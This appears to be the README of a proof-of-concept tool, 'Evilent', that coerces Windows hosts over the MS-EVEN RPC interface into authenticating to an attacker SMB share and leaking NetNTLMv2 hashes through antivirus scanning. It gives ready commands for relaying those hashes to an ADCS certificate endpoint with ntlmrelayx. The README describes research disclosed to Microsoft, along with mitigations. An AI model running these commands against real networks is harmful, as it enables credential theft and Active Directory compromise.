Evilent 🧨

A practical NTLM relay attack using the MS-EVEN RPC protocol and antivirus-assisted coercion.
⚙️ Overview

Evilent is a PoC tool that triggers the ElfrOpenBELW procedure in the MS-EVEN RPC interface (used for Windows Event Log service), causing the target machine to connect to an attacker-controlled SMB share. If antivirus software (e.g., Defender) is present, it may scan the file and unintentionally leak NetNTLMv2 credentials, which can be relayed via ntlmrelayx.

This project includes:

    evilent.py — triggers the MS-EVEN coercion

    fefender.py — helper script to run impacket-smbserver and ntlmrelayx in parallel for harvesting and relaying credentials

🧪 Research Context

This attack is a combination of previously known techniques:

    MS-EVEN coercion (originally PoC’d in C by @evilashz)

    NTLM leak through antivirus file scanning behavior

    Credential relaying via impacket’s ntlmrelayx

Presented at CyberWave2025 by @TCross, with responsible disclosure to Microsoft.
📦 Requirements

    Python 3.x
    impacket library
    metasploit (msfvenom)
    Target with antivirus enabled (e.g., Windows Defender)

🚀 Usage
Step 1: Start listener (SMB + relay)

In one terminal:

python3 fefender.py \
  --smbserver-args='Share ./ -smb2support' \
  --ntlmrelayx-args='-smb2support -t http://192.168.140.218/certsrv/certfnsh.asp --adcs --keep-relaying'

![image](https://github.com/user-attachments/assets/4eef02eb-c16c-46f0-91a0-37f486058b2b)

This will launch both:

    impacket-smbserver to serve the bait file

    ntlmrelayx to relay NTLM authentication to a target (e.g., ADCS)

Step 2: Trigger the attack

In another terminal:

python3 evilent.py -backupfile <Sharename>\\<filename> \
  <domain>/<username>:<password>@<target> \
  <listener>

    target: The victim machine (can be given as [domain/]username[:password]@<ip>)

    Listener IP: IP of the attacker's SMB server

    -backupfile: Optional filename to request (msfvenom generate this file)
    
![image](https://github.com/user-attachments/assets/0f8f6994-4b2c-431d-ac53-8f2ababbeb30)

🧠 Notes

    The attack works only in Active Directory environments.

    Authentication often comes from NT AUTHORITY\LOCAL SERVICE, but antivirus activity may cause the host machine account to leak NetNTLMv2.

    Exploitable file name variations (e.g., test.exeem䵌䵅P) must be prepared ahead on the SMB share.

    Environment variables like %USERNAME% may be expanded when referenced in UNC paths (e.g., \\attacker\%USERNAME%) — potential info leak.

🔐 Disclosure

Microsoft was notified and acknowledged the behavior. They provided security recommendations (e.g., disabling NTLM, monitoring RPC calls to eventlog pipe).
🙏 Credits

    @TCross — evilent.py and combined attack research

    @eversinc33 — impacket-based MS-EVEN PoC

    @evilashz — original C PoC for ElfrOpenBELW coercion

    Impacket — core toolkit for SMB, NTLM, and AD attacks
